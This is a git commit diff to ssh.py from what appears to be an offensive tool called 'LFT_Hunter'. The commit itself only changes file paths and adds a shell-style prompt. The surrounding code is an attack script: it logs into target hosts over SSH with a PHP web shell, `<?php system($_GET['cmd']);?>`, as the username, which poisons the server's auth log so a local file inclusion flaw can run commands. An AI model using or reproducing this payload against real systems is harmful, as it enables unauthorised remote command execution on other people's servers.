1ef29f5c1d67db240e9d5c97d407194d22e93dcd
jac11 <jac11devel@gmail.com>
2024-10-24 01:51:22 +0300

    Add files via upload

--- Package/shell/ssh.py
+++ Package/shell/ssh.py
@@ -2,13 +2,16 @@
 import os
 import paramiko
 import time
-with open (str(os.getcwd())+'/Banner','r') as read:
+with open ('./Package/Banner','r') as read:
      print(read.read())
-with open(str(os.getcwd())+'/shell/.address','r') as SSHIP:
+with open('./Package/shell/.address','r') as SSHIP:
          SSHIPH = SSHIP.readlines()  
 username = """<?php system($_GET['cmd']);?>"""
 password = "dosamething"
 port = 22 
+line = '┌──(SSH)-[~/LFT_Hunter]\n'
+line += '└─$ '
+print(line)
 try:           
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
